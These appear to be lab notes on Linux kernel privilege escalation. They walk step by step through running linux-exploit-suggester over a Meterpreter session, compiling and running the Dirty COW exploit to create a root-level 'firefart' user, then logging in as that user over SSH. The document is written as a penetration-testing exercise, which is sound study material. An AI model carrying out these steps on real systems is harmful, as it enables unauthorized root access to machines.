Kernel exploits on Linux will typically target vulnerabilities in the linux kernel to execute arbitary code in order to run privileged system commands or to obtain a system shell.
- this process will differ based on the kernel version and distribution being targeted and the kernel exploit being used.
- Privilege escalation on Linux systems will typically follow  the following methodoloy
- - identifying kernel vulnerabilities
- - Downloading compiling and transferring kernel exploits  onto the target system.

#### Tool and environment
- Linux-Exploit suggester - this tool is design to assist in detecting security deficiencies for given linux kernel/linux-based machine.It assesses (using heuristics methods) the exposure of the given kernel on every publicly known linux kernel exploit.
- Github:https://github.com/The-Z-Labs/linux-exploit-suggester
#### Exploit
- First of all we need a meterpreter shell.
- We need to gitclone the linux-exploit-suggester in our own kali linux machine
- cd /tmp [move to temp directory ]
- upload ~/Desktop/Linux-Enum/les.sh -> les.sh [  uploading les.sh file from attacker github clonning directory to meterpreter sessions ]
- shell [ for getting shell]
- /bin/bash -i [ for getting bash shell ]
- chmod +x les.sh [ giving executalbe permissions ]
- ./les.sh [ this script give all vulnerable information with their CVE's mention and associate a link of the cve ]
- In this case we are going to use dirty cow 1,and dirty cow 2
- download the exploit code into attacker machine and follow instruction
- gcc -pthread dirty.c -o dirty -lcrypt [ this will compile the code ]
- now move to meterpreter sessions 
- upload ~/Download/dirty [ uploading compile code ]
- If this compile code doesn't work we need to compline it in victim machine.
- shell [ getting shell ]
- /bin/bash -i
- chmod +x dirty [ giving permissons for execute ]
- ./dirty password123 [ run the file setting a password123 ]
- Doesn't work
- rm dirty [ removing dirty ]
- move meterpreter sessions
- uplaod ~/Downlaods/dirty.c [ upload the c file ]
- shell [getting a shell ]
- /bin/bash -i [ getting  a bash shell ]
- gcc -pthread dirty.c -o dirty -lcrypt [ again compiling it ]
-  chmod +x dirty [ giving executable permission ]
- ./dirty password123 [ run the code specifying a password ]
- cat /etc/passwd [ this shows passwd files where we see a firefart user with root privileged ]
- su firefart [ for switching user to firefart ]
- this shows a error "must be run from terminal"
- move to new tab
- ssh firefart@192.142.50.40
- this will again shows error read care fully and remove ssh-keygen with given in a error
- ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "192.142.50.40" [ this will remove key ]
- ssh firefart@192.142.50.40
- successful
- update apt-get update or apt-get update [ run the following one of two commands ]
